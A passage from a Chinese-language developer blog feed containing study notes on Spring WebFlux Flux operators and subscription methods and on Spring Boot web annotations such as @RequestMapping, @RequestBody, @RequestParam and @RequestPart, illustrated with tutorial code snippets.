function_">logExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>).<span class="hljs-title function_">log</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// 7. cache()</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; expensiveSource = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                                               .<span class="hljs-title function_">doOnSubscribe</span>(sub -&gt; <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;上游被调用&quot;</span>))<br>                                               .<span class="hljs-title function_">cache</span>();<br><br>    <span class="hljs-comment">// 8. share()</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; sharedSource = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">interval</span>(<span class="hljs-title class_">Duration</span>.<span class="hljs-title function_">ofSeconds</span>(<span class="hljs-number">1</span>))<br>                                            .<span class="hljs-title function_">map</span>(i -&gt; <span class="hljs-string">&quot;Tick-&quot;</span> + i)<br>                                            .<span class="hljs-title function_">take</span>(<span class="hljs-number">5</span>)<br>                                            .<span class="hljs-title function_">doOnSubscribe</span>(sub -&gt; <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;订阅共享流&quot;</span>))<br>                                            .<span class="hljs-title function_">share</span>();<br><br>    <span class="hljs-meta">@GetMapping</span>(value = <span class="hljs-string">&quot;/share&quot;</span>, produces = <span class="hljs-title class_">MediaType</span>.<span class="hljs-property">TEXT_EVENT_STREAM_VALUE</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">shareExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> sharedSource;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="6-1-2-10-订阅方法"><a href="#6-1-2-10-订阅方法" class="headerlink" title="6.1.2.10. 订阅方法"></a>6.1.2.10. 订阅方法</h6><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api/flux&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FluxHooksController</span> &#123;<br><br><span class="hljs-comment">// 1. subscribe()</span><br><span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribe&quot;</span>)</span><br><span class="hljs-keyword">public</span> Flux&lt;String&gt; subscribeExample() &#123;<br>    <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>               .subscribe();<br>&#125;<br><br><span class="hljs-comment">// 2. subscribe(onNext)</span><br><span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribeOnNext&quot;</span>)</span><br><span class="hljs-keyword">public</span> Flux&lt;String&gt; subscribeOnNextExample() &#123;<br>    <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;Item 1&quot;</span>, <span class="hljs-string">&quot;Item 2&quot;</span>)<br>               .subscribe(item -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;接收到的元素: &quot;</span> + item));<br>&#125;<br><br><span class="hljs-comment">// 3. subscribe(onNext, onError, onComplete)</span><br><span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribeAll&quot;</span>)</span><br><span class="hljs-keyword">public</span> Flux&lt;String&gt; subscribeAllExample() &#123;<br>    <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;Task 1&quot;</span>, <span class="hljs-string">&quot;Task 2&quot;</span>)<br>               .concatWith(Flux.error(new RuntimeException(<span class="hljs-string">&quot;Error in task&quot;</span>)))<br>               .subscribe(<br>                   item -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;收到任务: &quot;</span> + item), <br>                   error -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;发生错误: &quot;</span> + error.getMessage()), <br>                   () -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;任务完成&quot;</span>)<br>               );<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：已经有了 <code>subscribe(onNext, onError, onComplete)</code>，为什么还要使用 <code>doOnNext</code>、<code>doOnError</code>、<code>doOnComplete</code> 这些副作用操作</p><ol><li><strong><code>doOnNext</code>、<code>doOnError</code> 和 <code>doOnComplete</code></strong> 是为了在流处理过程中执行<strong>副作用</strong>（比如日志记录、统计、监控等），但它们不会直接影响流的最终输出。它们让你在流运行时插入额外的行为，而不改变流本身。</li><li><strong><code>subscribe(onNext, onError, onComplete)</code></strong> 是你处理流结果的地方。这是最终的反应——你是流的消费者，订阅流并处理实际的数据、错误和完成状态。</li></ol></blockquote><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h2 id="三、补充"><a href="#三、补充" class="headerlink" title="三、补充"></a>三、补充</h2><h4 id="操作行为划分"><a href="#操作行为划分" class="headerlink" title="操作行为划分"></a>操作行为划分</h4><ol><li>&#x3D;&#x3D;同步操作&#x3D;&#x3D;：<ol><li><font color="#00b0f0">同步简单操作</font>：<ol><li>快速执行、无明显耗时、不涉及复杂计算或 I&#x2F;O</li></ol></li><li><font color="#00b0f0">同步阻塞操作</font>：<ol><li>设计耗时计算或潜在阻塞操作（如 I&#x2F;O），但是在当前线程同步执行</li></ol></li></ol></li><li>&#x3D;&#x3D;异步操作&#x3D;&#x3D;：<ol><li><font color="#00b0f0">异步阻塞操作</font>：<ol><li>将同步阻塞操作通过异步机制（如线程池）执行，“伪非阻塞” 操作</li></ol></li><li><font color="#00b0f0">异步非阻塞操作</font>：<ol><li>完全非阻塞，通常是基于时间驱动或回调，依赖外部异步机制（如 <code>WebClient</code>、 <code>R2DBC</code>、<code>CompletableFuture</code>）</li></ol></li></ol></li><li>&#x3D;&#x3D;补充：I&#x2F;O&#x3D;&#x3D;：<ol><li>I&#x2F;O，即输入&#x2F;输出（Input&#x2F;Output），是指计算机与外部世界的信息交换过程，包括但不限于：<ol><li><font color="#00b0f0">网络请求</font>：<ol><li>如调用其他 HTTP API 接口（RestTemplate、WebClient）、JDBC、R2DBC 等等</li></ol></li><li><font color="#00b0f0">文件操作</font>：<ol><li>读取或写入硬盘上的文件</li></ol></li><li><font color="#00b0f0">用户交互</font>：<ol><li>键盘、鼠标等输入设备的信号获取，以及向显示器等输出设备发送信息。</li></ol></li><li><font color="#00b0f0">硬件通信</font>：<ol><li>与打印机、扫描仪等外部设备的数据交换</li></ol></li></ol></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring WebFlux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Boot</title>
    <link href="/2025/05/02/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Boot/"/>
    <url>/2025/05/02/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Boot/</url>
    
    <content type="html"><![CDATA[<h3 id="Scheduled-fixedRate-5000"><a href="#Scheduled-fixedRate-5000" class="headerlink" title="@Scheduled(fixedRate &#x3D; 5000)"></a>@Scheduled(fixedRate &#x3D; 5000)</h3><p>定时任务，可以用来定时发邮件、定期清理数据库、晚上跑报表等</p><h3 id="1-常用注解"><a href="#1-常用注解" class="headerlink" title="1. 常用注解"></a>1. 常用注解</h3><h4 id="1-1-Spring-Web-相关注解"><a href="#1-1-Spring-Web-相关注解" class="headerlink" title="1.1. Spring Web 相关注解"></a>1.1. Spring Web 相关注解</h4><h5 id="1-1-1-RequestMapping"><a href="#1-1-1-RequestMapping" class="headerlink" title="1.1.1. @RequestMapping"></a>1.1.1. @RequestMapping</h5><p><code>@RequestMapping</code> 用于将 HTTP 请求映射到控制器的方法。开发者可以通过这些注解定义特定的 URL 路径和请求方法，以处理不同类型的请求。这些注解可以应用于类或方法上。</p><p>其具有多种衍生注解，包括：</p><ol><li>&#x3D;&#x3D;@GetMapping&#x3D;&#x3D;：<ol><li>用于处理 GET 请求，等同于 <code>@RequestMapping(method = RequestMethod.GET)</code></li></ol></li><li>&#x3D;&#x3D;@PostMapping&#x3D;&#x3D;：<ol><li>用于处理 POST 请求，等同于 <code>@RequestMapping(method = RequestMethod.POST)</code></li></ol></li><li>&#x3D;&#x3D;@PutMapping&#x3D;&#x3D;：<ol><li>用于处理 PUT 请求，等同于 <code>@RequestMapping(method = RequestMethod.PUT)</code></li></ol></li><li>&#x3D;&#x3D;@DeleteMapping&#x3D;&#x3D;：<ol><li>用于处理 DELETE 请求，等同于 <code>@RequestMapping(method = RequestMethod.DELETE)</code></li></ol></li><li>&#x3D;&#x3D;@PatchMapping&#x3D;&#x3D;：<ol><li>用于处理 PATCH 请求，等同于 <code>@RequestMapping(method = RequestMethod.PATCH)</code><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 1. 语法结构</span><br><span class="hljs-variable">@RequestMapping</span>(value = &#123;<span class="hljs-string">&quot;URI 路径1&quot;</span>, <span class="hljs-string">&quot;URI 路径2&quot;</span>&#125;,  <br>        <span class="hljs-function"><span class="hljs-keyword">method</span> = <span class="hljs-title">RequestMethod</span>.<span class="hljs-title">GET</span>,  </span><br><span class="hljs-function">        <span class="hljs-title">params</span> = </span>&#123;<span class="hljs-string">&quot;请求参数的条件1&quot;</span>, <span class="hljs-string">&quot;请求参数的条件2&quot;</span>&#125;,  <br>        headers = &#123;<span class="hljs-string">&quot;请求头的条件1&quot;</span>, <span class="hljs-string">&quot;请求头的条件2&quot;</span>&#125;,  <br>        consumes = &#123;<span class="hljs-string">&quot;请求体的 MIME 类型1&quot;</span>, <span class="hljs-string">&quot;请求体的 MIME 类型2&quot;</span>&#125;  <br>)<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. value：</span><br><span class="hljs-string">1. 固定模式：</span><br><span class="hljs-string">1. /testValue</span><br><span class="hljs-string">2. 通配符模式：</span><br><span class="hljs-string">1. ？：</span><br><span class="hljs-string">1. 匹配任意单个字符，例如：<span class="hljs-variable">@RequestMapping</span>(&quot;</span>/<span class="hljs-keyword">x</span>?z/testValueAnt<span class="hljs-string">&quot;)</span><br><span class="hljs-string">2. *：</span><br><span class="hljs-string">1. 匹配路径中的零个或多个字符，例如：<span class="hljs-variable">@GetMapping</span>(&quot;</span>/files/*<span class="hljs-string">&quot;)</span><br><span class="hljs-string">3. **：</span><br><span class="hljs-string">1. 匹配多级路径，例如：<span class="hljs-variable">@GetMapping</span>(&quot;</span>/api/**<span class="hljs-string">&quot;)</span><br><span class="hljs-string">4. &#123;xx&#125;：</span><br><span class="hljs-string">1. 用于动态路由，例如：<span class="hljs-variable">@GetMapping</span>(&quot;</span>/users/<span class="hljs-string">&#123;id&#125;</span><span class="hljs-string">&quot;)</span><br><span class="hljs-string">2. method：</span><br><span class="hljs-string">1. 指定 HTTP 方法，如 GET、POST、PUT、DELETE 、PATCH等，如果请求类型不匹配，会出现 405 错误</span><br><span class="hljs-string">3. params:</span><br><span class="hljs-string">1. 指定请求参数的条件，只有满足条件的请求才会被该方法处理，如果请求参数条件不匹配，会出现 400 错误</span><br><span class="hljs-string">2. 例如：params = &#123;&quot;</span>username<span class="hljs-string">&quot;, &quot;</span>password=<span class="hljs-number">100</span><span class="hljs-string">&quot;,&quot;</span>!Host<span class="hljs-string">&quot;&#125; 表示需要包含 username 参数，不包含 Host 参数，且 password=100</span><br><span class="hljs-string">4. headers：</span><br><span class="hljs-string">1. 指定请求头的条件，只有满足条件的请求才会被该方法处理，如果请求头条件不匹配，会出现 400 或 415 错误</span><br><span class="hljs-string">2. 例如：headers=&#123;&quot;</span>Referer<span class="hljs-string">&quot;, &quot;</span>!Host<span class="hljs-string">&quot;,&quot;</span>X-Requested-With=XMLHttpRequest<span class="hljs-string">&quot;&#125; 表示需要包含 Referer 头，不包含 Host 头，且 X-Requested-With=XMLHttpRequest</span><br><span class="hljs-string">5. consumes：</span><br><span class="hljs-string">1. 指定请求体的 MIME 类型，仅当请求的 Content-Type 符合时才会调用该方法，如果请全体的内容类型不匹配，会出现 415 错误</span><br><span class="hljs-string">2. 例如：consumes = &#123;&quot;</span>application/json<span class="hljs-string">&quot;, &quot;</span>application/xml<span class="hljs-string">&quot;&#125;</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h5 id="1-1-2-RestController"><a href="#1-1-2-RestController" class="headerlink" title="1.1.2. @RestController"></a>1.1.2. @RestController</h5><p><code>@RestController</code> &#x3D; <code>@Controller</code> + <code>@ResponseBody</code></p><hr><h5 id="1-1-3-ResponseBody"><a href="#1-1-3-ResponseBody" class="headerlink" title="1.1.3. @ResponseBody"></a>1.1.3. @ResponseBody</h5><p>这个注解可以作用在类或方法上，用来告诉 Spring：返回值应直接写入 HTTP 响应体，而不是跳转到视图层（如 JSP 或 HTML 模板）。通俗点说，它让方法的返回结果以 JSON 格式返回，并自动完成数据转换。</p><p>我们常用的 <code>@RestController</code> 实际上就是 <code>@Controller + @ResponseBody</code> 的组合，意味着类中所有方法默认都启用了 <code>@ResponseBody</code>，不需要每个方法单独添加。<br> <figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/hello&quot;</span>)<br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><h5 id="1-1-4-RequestBody"><a href="#1-1-4-RequestBody" class="headerlink" title="1.1.4. @RequestBody"></a>1.1.4. @RequestBody</h5><p><code>@RequestBody</code> 是用于将请求体中的 JSON 数据反序列化为 Java 对象的注解。</p><p>注意：也能将请求体中的 XML 数据反序列化为 Java 对象，但需要添加 <code>Jackson XML</code> 依赖</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs julia"><span class="hljs-comment"># 1. 前端请求</span><br>POST /user<br>Content-<span class="hljs-built_in">Type</span>: application/json<br><br>&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>  <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">28</span><br>&#125;<br><br><br><span class="hljs-comment"># 2. 后端处理</span><br><span class="hljs-meta">@PostMapping</span>(<span class="hljs-string">&quot;/user&quot;</span>)<br>public <span class="hljs-built_in">String</span> createUser(<span class="hljs-meta">@RequestBody</span> User user) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User created: &quot;</span> + user.getName();<br>&#125;<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">// User Pojo 类</span><br><span class="hljs-string">public class User &#123;</span><br><span class="hljs-string">    private String name;</span><br><span class="hljs-string">    private int age;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>本注解专注以处理这种场景：</li></ol></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-number">1.</span> AJAX<br><span class="hljs-keyword">fetch</span>(<span class="hljs-string">&#x27;/user&#x27;</span>, &#123;<br>  <span class="hljs-keyword">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  headers: &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>  &#125;,<br>  body: <span class="hljs-type">JSON</span>.stringify(&#123;<br>    username: <span class="hljs-string">&#x27;张三&#x27;</span>,<br>    email: <span class="hljs-string">&#x27;123@example.com&#x27;</span><br>  &#125;)<br>&#125;)<br>.<span class="hljs-keyword">then</span>(response =&gt; response.text())<br>.<span class="hljs-keyword">then</span>(data =&gt; console.log(data));<br><br><br>// <span class="hljs-number">2.</span> 发送请求<br>POST /<span class="hljs-keyword">user</span> HTTP/<span class="hljs-number">1.1</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br><br>&#123;<br>  &quot;username&quot;: &quot;张三&quot;,<br>  &quot;email&quot;: &quot;123@example.com&quot;<br>&#125;<br><br><br>// <span class="hljs-number">3.</span> 后端接收<br>@PostMapping(&quot;/user&quot;)<br><span class="hljs-built_in">public</span> String createUser(@RequestBody <span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span>) &#123;<br>    <span class="hljs-keyword">return</span> &quot;收到: 用户名=&quot; + <span class="hljs-keyword">user</span>.getUsername() + &quot;, 邮箱=&quot; + <span class="hljs-keyword">user</span>.getEmail();<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-1-5-RequestParam"><a href="#1-1-5-RequestParam" class="headerlink" title="1.1.5. @RequestParam"></a>1.1.5. @RequestParam</h5><p><code>@RequestParam</code> 用于将 HTTP 请求参数（URL 查询参数、表单参数） 绑定到 Controller 方法的参数上：</p><ol><li>&#x3D;&#x3D;URL 查询参数、表单参数&#x3D;&#x3D;：<ol><li>类似于：<code>GET /user?name=Tom&amp;age=18</code><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs julia"><span class="hljs-comment"># 1. 语法结构</span><br><span class="hljs-meta">@RequestParam</span>(value = <span class="hljs-string">&quot;参数名&quot;</span>, required = 是否必须, defaultValue = <span class="hljs-string">&quot;默认值&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. value：</span><br><span class="hljs-string">1. 请求参数的名称，如果方法参数名和请求参数名一致，可以省略</span><br><span class="hljs-string">2. reuqired：</span><br><span class="hljs-string">1. 参数是否必须。</span><br><span class="hljs-string">2. 默认是 true，如果缺少这个参数，会抛出异常。</span><br><span class="hljs-string">3. defaultValu：</span><br><span class="hljs-string">1. 设置默认值。</span><br><span class="hljs-string">2. 如果请求中没有这个参数，就使用默认值。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 2. 示例一</span><br><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/search&quot;</span>)<br>public <span class="hljs-built_in">String</span> search(<span class="hljs-meta">@RequestParam</span> <span class="hljs-built_in">String</span> keyword) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Searching for: &quot;</span> + keyword;<br>&#125;<br><br><br><span class="hljs-comment"># 3. 示例二</span><br><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/page&quot;</span>)<br>public <span class="hljs-built_in">String</span> page(<span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;p&quot;</span>) int pageNumber) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Page number: &quot;</span> + pageNumber;<br>&#125;<br><br><br><span class="hljs-comment"># 4. 示例三</span><br><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/list&quot;</span>)<br>public <span class="hljs-built_in">String</span> list(<span class="hljs-meta">@RequestParam</span>(defaultValue = <span class="hljs-string">&quot;1&quot;</span>) int page,<br>                   <span class="hljs-meta">@RequestParam</span>(defaultValue = <span class="hljs-string">&quot;10&quot;</span>) int size) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Page: &quot;</span> + page + <span class="hljs-string">&quot;, Size: &quot;</span> + size;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>本注解专注以处理这种场景：</li></ol></blockquote><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 1. HTML 表单</span><br>&lt;form method=<span class="hljs-string">&quot;post&quot;</span> action=<span class="hljs-string">&quot;/submit&quot;</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;张三&quot;</span> /&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123@example.com&quot;</span> /&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>&lt;/form&gt;<br><br><br><span class="hljs-comment">// 2. 发送请求</span><br><span class="hljs-variable constant_">POST</span> /submit <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: application/x-www-form-urlencoded<br><br>username=张三&amp;email=<span class="hljs-number">123</span><span class="hljs-meta">@example</span>.<span class="hljs-property">com</span><br><br><br><span class="hljs-comment">// 3. 后端接收</span><br><span class="hljs-meta">@PostMapping</span>(<span class="hljs-string">&quot;/submit&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">submitForm</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> username, <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> email</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;收到: 用户名=&quot;</span> + username + <span class="hljs-string">&quot;, 邮箱=&quot;</span> + email;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-1-6-RequestPart"><a href="#1-1-6-RequestPart" class="headerlink" title="1.1.6. @RequestPart"></a>1.1.6. @RequestPart</h5><p><code>@RequestPart</code> 专门用于处理 <code>multipart/form-data</code> 请求，用于将请求参数绑定到 Controller 方法的参数上，使用方法与 <code>@RequestParam</code> 类似。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>本注解专注以处理这种场景：</li></ol></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-number">1.</span> HTML 表单<br>&lt;form <span class="hljs-keyword">method</span>=&quot;post&quot; action=&quot;/upload&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>  &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;text&quot; <span class="hljs-type">name</span>=&quot;description&quot; <span class="hljs-keyword">value</span>=&quot;我的照片&quot; /&gt;<br>  &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;file&quot; <span class="hljs-type">name</span>=&quot;file&quot; /&gt;<br>  &lt;button <span class="hljs-keyword">type</span>=&quot;submit&quot;&gt;上传&lt;/button&gt;<br>&lt;/form&gt;<br><br><br>// <span class="hljs-number">2.</span> JS<br>const formData = <span class="hljs-built_in">new</span> FormData();<br>formData.append(<span class="hljs-string">&#x27;description&#x27;</span>, <span class="hljs-string">&#x27;我的照片&#x27;</span>);<br>formData.append(<span class="hljs-string">&#x27;file&#x27;</span>, document.querySelector(<span class="hljs-string">&#x27;input[type=&quot;file&quot;]&#x27;</span>).files[<span class="hljs-number">0</span>]);<br>formData.append(<span class="hljs-string">&#x27;metadata&#x27;</span>, <span class="hljs-type">JSON</span>.stringify(&#123; title: <span class="hljs-string">&#x27;我的照片&#x27;</span> &#125;));<br><br><span class="hljs-keyword">fetch</span>(<span class="hljs-string">&#x27;/upload&#x27;</span>, &#123;<br>  <span 